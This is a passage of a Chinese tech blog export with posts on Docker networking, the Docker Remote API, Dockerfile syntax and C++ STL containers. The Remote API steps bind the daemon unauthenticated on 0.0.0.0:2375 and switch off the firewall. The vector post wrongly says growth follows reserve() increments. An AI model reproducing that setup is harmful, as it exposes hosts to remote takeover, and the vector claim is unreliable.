<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it --name net_4 --network container:net_1 my_ubuntu_03 /bin/bash</span></span><br><span class="line">root@5eb98cff1ec6:/# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:c0:a8:64:02</span><br><span class="line">          inet addr:192.168.100.2  Bcast:0.0.0.0  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::42:c0ff:fea8:6402/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:8 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:648 (648.0 B)  TX bytes:648 (648.0 B)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>

<p>容器‘net_1’的网卡信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> -it net_1 /bin/bash</span></span><br><span class="line">root@5eb98cff1ec6:/# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:c0:a8:64:02</span><br><span class="line">          inet addr:192.168.100.2  Bcast:0.0.0.0  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::42:c0ff:fea8:6402/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:16 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:1395 (1.3 KB)  TX bytes:1284 (1.2 KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:4 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:375 (375.0 B)  TX bytes:375 (375.0 B)</span><br></pre></td></tr></table></figure>

<ul>
<li>复制主机名</li>
<li>复制MAC地址</li>
<li>复制IP地址</li>
</ul>
<h1 id="Docker-Remote-API"><a href="#Docker-Remote-API" class="headerlink" title="Docker Remote API"></a>Docker Remote API</h1><h2 id="开启Remote-API"><a href="#开启Remote-API" class="headerlink" title="开启Remote API"></a>开启Remote API</h2><p>以RHEL7.2为例，开启Docker Remote API服务</p>
<ol>
<li>修改systemd中的docker.server<br> 找到<code>ExecStart</code>项，增加<code>-H tcp://0.0.0.0:2375</code>允许任意客户端访问；增加<code>-H unix:///var/run/docker.sock</code>保证<code>docker</code>命令能正常使用。<br> 若需要使用HTTPS证书，可以增加<code>--tls=true --tlscert=cert.pem --tlskey=key.pem</code>。<a href="https://docs.docker.com/engine/admin/">详细请见</a></li>
<li>增加防火墙规则／关闭防火墙<br> RHEL7.2中防火墙服务为<code>firewalld</code>。<br> eg: <code>sudo systemctl stop firewalld</code></li>
<li>重启docker服务<br> 重载配置<code>sudo systemctl daemon-reload</code><br> 重启服务<code>sudo systemctl restart docker</code></li>
</ol>
<h2 id="API使用说明"><a href="#API使用说明" class="headerlink" title="API使用说明"></a>API使用说明</h2><p>详细请见：<a href="https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/">《Docker Remote API v1.24》</a></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.docker.com/">docker官网</a></li>
<li><a href="https://hub.docker.com/">docker hub</a></li>
<li><a href="http://wwwbuild.net/dockerone/263124.html">Docker开源组件：HyperKit、VPNKit和DataKit介绍</a></li>
<li><a href="http://www.tuicool.com/articles/uAvQRz6">docker save&#x2F;load, export&#x2F;import测试对比</a></li>
<li><a href="http://www.cnblogs.com/liuyansheng/p/6097710.html">Docker 数据卷管理</a></li>
<li><a href="http://www.tuicool.com/articles/uYzeAnz">深入理解 Docker Volume（一）</a></li>
<li><a href="http://www.cnblogs.com/sammyliu/p/5932996.html">理解Docker（8）：Docker 存储之卷（Volume）</a></li>
<li><a href="http://blog.csdn.net/halcyonbaby/article/details/42112141">docker的四种网络方式</a></li>
<li><a href="https://docs.docker.com/engine/reference/api/docker_remote_api/">Docker Remote API</a></li>
<li><a href="https://www.zhihu.com/question/24852884">Docker Remote API 如何使用？</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Volume Plugin 之 NBD-RBD(Ceph)</title>
    <url>/2017/12/07/container/docker/docker-volplugin-nbd-rbd/</url>
    <content><![CDATA[<p>Ceph官网有一篇<a href="http://ceph.com/planet/getting-started-with-the-docker-rbd-volume-plugin/">“Getting started with the Docker RBD volume plugin”</a>里面提到了一个驱动<a href="https://github.com/yp-engineering/rbd-docker-plugin">“github.com&#x2F;yp-engineering&#x2F;rbd-docker-plugin”</a>，此驱动使用的是krbd（kernel RBD）。krbd与librbd相比很多功能被阉割了，如果你只想用Ceph作为backend，那你可以使用这个驱动。如果你不甘心只是简单的使用Ceph，还想体验他的很多特性，那你可以考虑下面这个方案。。。</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>本方案的想法来自于Ceph的一个命令<code>nbd-rbd</code>，只要你的系统支持nbd，并且支持docker，nbd与rbd的通讯方式依然使用socket文件的形式，只是rbd client相关程序需要放置到容器中；因为有些操作系统没有包管理器，不能方便的安装软件包(如：CoreOS)。</p>
<p><img src="/images/docker/docker_volplugin_nbd_rbd.png" alt="docker_volplugin_nbd_rbd.png"></p>
<p>图画的这么清晰，还需要再说明吗！好吧，还是再说点儿吧。</p>
<ul>
<li>每个nbd设备与rbd设备之间使用一个socket文件进行通讯</li>
<li>NBDServer用于管理所有nbd设备</li>
<li>RBDServer用于管理所有rbd设备</li>
</ul>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>*** Todo… ***</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1>]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile</title>
    <url>/2016/12/30/container/docker/dockerfile-write/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Dockerfile是docker image构建脚本，是用于生成image。Dockerfile忽略大小写，使用‘#’注释，每行只执行一条指令。Dockerfile指令分为两种，构建指令和设置指令。</p>
<ul>
<li>构建指令，用于构建image，不会在image的容器上执行</li>
<li>设置指令，用于设置image属性，会在image的容器上执行</li>
</ul>
<h1 id="Dockerfile指令"><a href="#Dockerfile指令" class="headerlink" title="Dockerfile指令"></a>Dockerfile指令</h1><h2 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h2><p>构建指令，用于指定基础image。该指令必须指定在Dockerfile其它指令的前面，后面的Dockerfile指令都依赖于该指令指定的image。FROM指令指定的基础image可以是官方docker hub仓库中的，也可以是位于本地仓库中的。</p>
<p>指令格式：<code>FROM &lt;image&gt;[:&lt;tag&gt;]</code><br>若不指定<code>:&lt;tag&gt;</code>，默认使用<code>:latest</code>。</p>
<h2 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h2><p>构建指令，用于将image的制作者相关信息写入到image中。</p>
<p>指令格式：<code>MAINTAINER &lt;name&gt;</code></p>
<h2 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h2><p>构建指令，可以运行任何被基础image支持的命令。</p>
<p>指令格式：<code>RUN &lt;command&gt;</code> 或 <code>RUN [&quot;executable&quot;,&quot;param 1&quot;,&quot;param n&quot;]</code><br>一般用于软件安装</p>
<h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>设置指令，用于container启动时指定的操作。该操作可以是执行自定义脚本，也可以是执行系统命令。该指令只能在文件中存在一次，如果有多个，则只执行最后一条。</p>
<p>指令格式：<code>CMD &lt;executable&gt; &lt;param 1&gt; &lt;param n&gt;</code> 或 <code>CMD [&quot;executable&quot;, &quot;param 1&quot;, &quot;param n&quot;]</code></p>
<h2 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h2><p>设置指令，指定容器启动时执行的命令，可以多次设置，但是只有最后一个有效。</p>
<p>指令格式：<code>ENTRYPOINT [&quot;executable&quot;, &quot;param 1&quot;, &quot;param n&quot;]</code> 或 <code>ENTRYPOINT &lt;executable&gt; &lt;param 1&gt; &lt;param n&gt;</code><br>CMD指令和ENTRYPOINT会互相覆盖只有最后一个CMD或者ENTRYPOINT有效。</p>
<p>和CMD指令配合使用来指定ENTRYPOINT的默认参数，这时CMD指令不是一个完整的可执行命令，仅仅是参数部分。ENTRYPOINT指令只能使用JSON方式指定执行命令，而不能指定参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos7</span><br><span class="line">CMD [<span class="string">&quot;-l&quot;</span>]</span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/usr/bin/ls&quot;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><p>设置指令，设置启动容器的用户，默认是root用户</p>
<p>指令格式：<code>USER &lt;user name&gt;</code></p>
<h2 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h2><p>设置指令，该指令会将容器中的端口映射成宿主机器中的某个端口。需要访问容器的时候，可以不是用容器的IP地址而是使用宿主机器的IP地址和映射后的端口。首先在Dockerfile使用EXPOSE设置需要映射的容器端口，然后在运行容器的时候指定-p选项加上EXPOSE设置的端口，这样EXPOSE设置的端口号会被随机映射成宿主机器中的一个端口号。也可以指定需要映射到宿主机器的那个端口，这时要确保宿主机器上的端口号没有被使用。EXPOSE指令可以一次设置多个端口号，相应的运行容器的时候，可以配套的多次使用-p选项。</p>
<p>指令格式：<code>EXPOSE &lt;port&gt; [&lt;port&gt;...]</code></p>
<h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>构建指令，在image中设置一个环境变量</p>
<p>指令格式：<code>ENV &lt;key&gt; &lt;value&gt;</code><br>设置了后，后续的RUN命令都可以使用，container启动后，可以通过docker inspect查看这个环境变量，也可以通过在docker run –env key&#x3D;value时设置或修改环境变量。</p>
<h2 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h2><p>构建指令，从src复制文件到container的dest路径。</p>
<p>指令格式：<code>ADD &lt;src&gt; &lt;dest&gt;</code></p>
<ul>
<li><code>&lt;src&gt;</code>是相对被构建的源目录的相对路径，可以是文件或目录的路径，也可以是一个远程的文件url</li>
<li><code>&lt;dest&gt;</code>是container中的绝对路径<br>所有拷贝到container中的文件和文件夹权限为0755，uid和gid为0；如果是一个目录，那么会将该目录下的所有文件添加到container中，不包括目录；如果文件是可识别的压缩格式，则docker会帮忙解压缩（注意压缩格式）；如果<code>&lt;src&gt;</code>是文件且<code>&lt;dest&gt;</code>中不使用斜杠结束，则会将<code>&lt;dest&gt;</code>视为文件，<code>&lt;src&gt;</code>的内容会写入<code>&lt;dest&gt;</code>；如果<code>&lt;src&gt;</code>是文件且<code>&lt;dest&gt;</code>中使用斜杠结束，则会<code>&lt;src&gt;</code>文件拷贝到<code>&lt;dest&gt;</code>目录下。</li>
</ul>
<h2 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h2><p>设置指令，指定挂载点。使容器中的一个目录具有持久化存储数据的功能，该目录可以被容器本身使用，也可以共享给其他容器使用。我们知道容器使用的是AUFS，这种文件系统不能持久化数据，当容器关闭后，所有的更改都会丢失。当容器中的应用有持久化数据的需求时可以在Dockerfile中使用该指令。</p>
<p>指令格式：<code>VOLUME [&quot;&lt;mount point path&gt;&quot;]</code></p>
<h2 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h2><p>设置指令，切换目录，可多次切换（相当于cd命令），对<code>RUN</code>、<code>CMD</code>、<code>ENTRYPOINT</code>生效</p>
<p>指令格式：<code>WORKDIR &lt;path&gt;</code></p>
<h2 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h2><p>设置指令，在子镜像中执行，在构建镜像时并不执行，而是在它的子镜像中执行</p>
<p>指令格式：<code>ONBUILD &lt;Dockerfile指令&gt;</code></p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一条有效指令必须指出基础镜像</span></span><br><span class="line">FROM my_ubuntu_03:latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">作者</span></span><br><span class="line">MAINTAINER zhou bo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">环境变量</span></span><br><span class="line">ENV BASE_IMAGE=&quot;ubuntu:16&quot;</span><br><span class="line">ENV CURRENT_IMAGE=&quot;Simple Image&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 ssh server 端程序</span></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y openssh-server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">映射端口22</span></span><br><span class="line">EXPOSE 22</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 ssh 守护进程</span></span><br><span class="line">CMD [&quot;-D&quot;]</span><br><span class="line">ENTRYPOINT [&quot;/usr/sbin/sshd&quot;]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 / 目录下挂在一个 DataFolder 目录</span></span><br><span class="line">VOLUME [&quot;/DataFolder&quot;]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在子镜像中执行的指令</span></span><br><span class="line">ONBUILD ENV SON_IAMGE=&quot;你永远是我儿子&quot;</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/qinyushuang/article/details/43342553">如何使用Dockerfile构建镜像</a></li>
<li><a href="http://blog.csdn.net/i6448038/article/details/50855538">Dockerfile指令详解</a></li>
<li><a href="http://www.tuicool.com/articles/YfMFVv6">Dockerfile文件编写</a></li>
<li><a href="http://blog.csdn.net/wanglei_storage/article/details/48709255">dockerfile 多端口映射 expose</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>dockerfile</tag>
      </tags>
  </entry>
  <entry>
    <title>STL容器们</title>
    <url>/2021/09/28/language/cpp/stl-container/</url>
    <content><![CDATA[<p>c++中stl涉及到的容器类（或struct）有很多，具体都是什么原理呢？</p>
<h2 id="std-array"><a href="#std-array" class="headerlink" title="std::array"></a>std::array</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Tp, std::<span class="type">size_t</span> _Nm&gt;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">__array_traits</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">typedef</span> _Tp _Type[_Nm];</span><br><span class="line">        <span class="keyword">typedef</span> __is_swappable&lt;_Tp&gt; _Is_swappable;</span><br><span class="line">        <span class="keyword">typedef</span> __is_nothrow_swappable&lt;_Tp&gt; _Is_nothrow_swappable;</span><br><span class="line"></span><br><span class="line">        <span class="type">static</span> <span class="keyword">constexpr</span> _Tp&amp;</span><br><span class="line">        _S_ref(<span class="type">const</span> _Type&amp; <span class="type">__t</span>, std::<span class="type">size_t</span> __n) <span class="keyword">noexcept</span></span><br><span class="line">        &#123; <span class="keyword">return</span> <span class="built_in">const_cast</span>&lt;_Tp&amp;&gt;(<span class="type">__t</span>[__n]); &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">static</span> <span class="keyword">constexpr</span> _Tp*</span><br><span class="line">        _S_ptr(<span class="type">const</span> _Type&amp; <span class="type">__t</span>) <span class="keyword">noexcept</span></span><br><span class="line">        &#123; <span class="keyword">return</span> <span class="built_in">const_cast</span>&lt;_Tp*&gt;(<span class="type">__t</span>); &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Tp, std::<span class="type">size_t</span> _Nm&gt;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">array</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">typedef</span> _Tp                                     value_type;</span><br><span class="line">        <span class="keyword">typedef</span> value_type*                             pointer;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="type">const</span> value_type*                       const_pointer;</span><br><span class="line">        <span class="keyword">typedef</span> value_type&amp;                             reference;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="type">const</span> value_type&amp;                       const_reference;</span><br><span class="line">        <span class="keyword">typedef</span> value_type*                             iterator;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="type">const</span> value_type*                       const_iterator;</span><br><span class="line">        <span class="keyword">typedef</span> std::<span class="type">size_t</span>                             size_type;</span><br><span class="line">        <span class="keyword">typedef</span> std::<span class="type">ptrdiff_t</span>                          difference_type;</span><br><span class="line">        <span class="keyword">typedef</span> std::reverse_iterator&lt;iterator&gt;         reverse_iterator;</span><br><span class="line">        <span class="keyword">typedef</span> std::reverse_iterator&lt;const_iterator&gt;   const_reverse_iterator;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Support for zero-sized arrays mandatory.</span></span><br><span class="line">        <span class="keyword">typedef</span> _GLIBCXX_STD_C::__array_traits&lt;_Tp, _Nm&gt; _AT_Type;</span><br><span class="line">        <span class="keyword">typename</span> _AT_Type::_Type                         _M_elems;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// No explicit construct/copy/destroy for aggregate type.</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>看这里<code>typename _AT_Type::_Type _M_elems;</code>再看这里<code>typedef _Tp _Type[_Nm];</code>。懂了吗，就是在栈上分配一个大小固定的数组。</p>
<h2 id="std-vector"><a href="#std-vector" class="headerlink" title="std::vector"></a>std::vector</h2><p><code>vector</code>也是一个数组，只是不是分配在栈上的，而是分配在堆上的。</p>
<p>看这里有一个<code>_Alloc</code>默认使用的是<code>std::allocator&lt;_Tp&gt;</code>，这就是在堆上分配内存用的。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  @brief A standard container which offers fixed time access to</span></span><br><span class="line"><span class="comment">     *  individual elements in any order.</span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     *  @ingroup sequences</span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     *  @tparam _Tp  Type of element.</span></span><br><span class="line"><span class="comment">     *  @tparam _Alloc  Allocator type, defaults to allocator&lt;_Tp&gt;.</span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     *  Meets the requirements of a &lt;a href=&quot;tables.html#65&quot;&gt;container&lt;/a&gt;, a</span></span><br><span class="line"><span class="comment">     *  &lt;a href=&quot;tables.html#66&quot;&gt;reversible container&lt;/a&gt;, and a</span></span><br><span class="line"><span class="comment">     *  &lt;a href=&quot;tables.html#67&quot;&gt;sequence&lt;/a&gt;, including the</span></span><br><span class="line"><span class="comment">     *  &lt;a href=&quot;tables.html#68&quot;&gt;optional sequence requirements&lt;/a&gt; with the</span></span><br><span class="line"><span class="comment">     *  %exception of @c push_front and @c pop_front.</span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     *  In some terminology a %vector can be described as a dynamic</span></span><br><span class="line"><span class="comment">     *  C-style array, it offers fast and efficient access to individual</span></span><br><span class="line"><span class="comment">     *  elements in any order and saves the user from worrying about</span></span><br><span class="line"><span class="comment">     *  memory and size allocation.  Subscripting ( @c [] ) access is</span></span><br><span class="line"><span class="comment">     *  also provided as with C-style arrays.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Tp, <span class="keyword">typename</span> _Alloc = std::allocator&lt;_Tp&gt; &gt;</span><br><span class="line">  <span class="keyword">class</span> vector : <span class="keyword">protected</span> _Vector_base&lt;_Tp, _Alloc&gt;</span><br><span class="line">  &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _GLIBCXX_CONCEPT_CHECKS</span></span><br><span class="line">    <span class="comment">// Concept requirements.</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _Alloc::value_type               _Alloc_value_type;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __cplusplus &lt; 201103L</span></span><br><span class="line">    __glibcxx_class_requires(_Tp, _SGIAssignableConcept)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">    __glibcxx_class_requires2(_Tp, _Alloc_value_type, _SameTypeConcept)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus &gt;= 201103L</span></span><br><span class="line">    <span class="built_in">static_assert</span>(is_same&lt;<span class="keyword">typename</span> remove_cv&lt;_Tp&gt;::type, _Tp&gt;::value,</span><br><span class="line">        <span class="string">&quot;std::vector must have a non-const, non-volatile value_type&quot;</span>);</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __cplusplus &gt; 201703L || defined __STRICT_ANSI__</span></span><br><span class="line">    <span class="built_in">static_assert</span>(is_same&lt;<span class="keyword">typename</span> _Alloc::value_type, _Tp&gt;::value,</span><br><span class="line">        <span class="string">&quot;std::vector must have the same value_type as its allocator&quot;</span>);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> _Vector_base&lt;_Tp, _Alloc&gt;                 _Base;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _Base::_Tp_alloc_type            _Tp_alloc_type;</span><br><span class="line">    <span class="keyword">typedef</span> __gnu_cxx::__alloc_traits&lt;_Tp_alloc_type&gt; _Alloc_traits;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">typedef</span> _Tp                                       value_type;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">typename</span> _Base::pointer                   pointer;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">typename</span> _Alloc_traits::const_pointer     const_pointer;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">typename</span> _Alloc_traits::reference         reference;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="keyword">typename</span> _Alloc_traits::const_reference   const_reference;</span><br><span class="line">        <span class="keyword">typedef</span> __gnu_cxx::__normal_iterator&lt;pointer, vector&gt; iterator;</span><br><span class="line">        <span class="keyword">typedef</span> __gnu_cxx::__normal_iterator&lt;const_pointer, vector&gt;</span><br><span class="line">        const_iterator;</span><br><span class="line">        <span class="keyword">typedef</span> std::reverse_iterator&lt;const_iterator&gt;     const_reverse_iterator;</span><br><span class="line">        <span class="keyword">typedef</span> std::reverse_iterator&lt;iterator&gt;           reverse_iterator;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="type">size_t</span>                                    size_type;</span><br><span class="line">        <span class="keyword">typedef</span> <span class="type">ptrdiff_t</span>                                 difference_type;</span><br><span class="line">        <span class="keyword">typedef</span> _Alloc                                    allocator_type;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>再看这里定义了三个指针，用的是<code>typedef typename _Base::pointer pointer;</code>类型。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> std _GLIBCXX_VISIBILITY(<span class="keyword">default</span>)</span><br><span class="line">&#123;</span><br><span class="line">_GLIBCXX_BEGIN_NAMESPACE_VERSION</span><br><span class="line">_GLIBCXX_BEGIN_NAMESPACE_CONTAINER</span><br><span class="line"></span><br><span class="line">  <span class="comment">/// See bits/stl_deque.h&#x27;s _Deque_base for an explanation.</span></span><br><span class="line">  <span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Tp, <span class="keyword">typename</span> _Alloc&gt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_Vector_base</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> __gnu_cxx::__alloc_traits&lt;_Alloc&gt;::<span class="keyword">template</span></span><br><span class="line">      rebind&lt;_Tp&gt;::other _Tp_alloc_type;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> __gnu_cxx::__alloc_traits&lt;_Tp_alloc_type&gt;::pointer</span><br><span class="line">      pointer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_Vector_impl_data</span></span><br><span class="line">    &#123;</span><br><span class="line">      pointer _M_start;</span><br><span class="line">      pointer _M_finish;</span><br><span class="line">      pointer _M_end_of_storage;</span><br><span class="line"></span><br><span class="line">      _Vector_impl_data() _GLIBCXX_NOEXCEPT</span><br><span class="line">      : _M_start(), _M_finish(), _M_end_of_storage()</span><br><span class="line">      &#123; &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>指针分别叫：<code>pointer _M_start;</code>、<code>pointer _M_finish;</code>、<code>pointer _M_end_of_storage;</code> 之前不叫这个的，现在都改了。。。无所谓了，含义没变。。。</p>
<p><code>vector</code>在堆上申请了一块内存，用于存放数组元素。用<code>_M_start</code>表示数组开始的位置，用<code>_M_finish</code>数据结束的位置，用<code>_M_end_of_storage</code> 表示这块内存容量结束的位置。</p>
<ul>
<li>当<code>vector</code>容量不足时，需要进行扩容，扩容会引发内存拷贝。</li>
<li>当向<code>vector</code>插入、删除某些元素时，由于采用连续存储方式，也会引发内存拷贝。</li>
</ul>
<h3 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h3><p>刚刚提到了扩容，如果一个<code>vector</code>容量不足了需要扩容，应该扩多少呢？这个根据<code>reserve()</code>的值来决定。如果你没有设置的话，按你存入的数据量进行扩容。如果你设置了这个值，那么每次扩<code>reserve()</code>个。</p>
<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>To be countinue…</p>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>C++智能指针</title>
    <url>/2021/09/23/language/cpp/smart-pointers/</url>
    <content><![CDATA[<p>智能指针，从其本质上说，就是要控制对象的销毁时机。换句话讲就是何时调用对象的析构函数。从C++11开始引入三个智能指针（<code>unique_ptr</code>,<code>shared_ptr</code>,<code>weak_ptr</code>），准确的说是四种（还有<code>auto_ptr</code>），但从C++17开始<code>auto_ptr</code>被移除了。所以就剩下上述三种了。所有的智能指针都包含在<code>memory</code>头文件中。</p>
<p>首先，很久以前的C++是没有智能指针的，用户创建在堆上的内存，智能自己显示的释放，如果没有释放就会造成内存泄漏。这种特点导致C++的使用成本很高，为了降低成本，引入了智能指针<code>unique_ptr</code>和<code>shared_ptr</code>。</p>
<h2 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="unique_ptr"></a>unique_ptr</h2><p><code>unique_ptr</code>采用的是传递所有权的方式来控制对象的销毁时机。如其名字所示，其对象是独享的。</p>
